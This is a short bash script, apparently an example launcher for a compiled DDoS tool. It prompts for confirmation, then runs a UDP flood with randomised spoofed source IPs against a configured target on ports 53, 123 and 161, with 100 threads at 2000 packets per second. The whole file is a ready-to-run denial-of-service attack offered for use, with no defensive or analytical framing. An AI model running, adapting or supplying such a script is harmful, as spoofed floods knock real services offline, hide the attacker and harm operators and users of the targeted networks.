#!/bin/bash

# UDP flood with IP spoofing example
# This script demonstrates UDP flooding with spoofed source IPs
# Requires root privileges

echo "UDP Flood with IP Spoofing Example"
echo "================================="

# Check for root privileges
if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root for IP spoofing capabilities"
   echo "Usage: sudo $0"
   exit 1
fi

# Target configuration
TARGET_IP="192.168.1.100"
TARGET_PORTS="53,123,161"
THREADS=100
RATE=2000
PACKET_SIZE=512

echo "Target: $TARGET_IP"
echo "Ports: $TARGET_PORTS"
echo "Threads: $THREADS"
echo "Rate: $RATE packets/sec"
echo "Packet Size: $PACKET_SIZE bytes"
echo "IP Spoofing: Enabled"
echo ""

read -p "Continue with spoofed UDP flood? (y/N): " -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
    echo "Starting UDP flood with IP spoofing..."
    echo "Source IPs will be randomized."
    
    ./target/release/ddos-attack layer4 \
        --targets "$TARGET_IP" \
        --ports "$TARGET_PORTS" \
        --protocol udp \
        --threads $THREADS \
        --rate $RATE \
        --size $PACKET_SIZE \
        --spoof
else
    echo "Attack cancelled."
fi
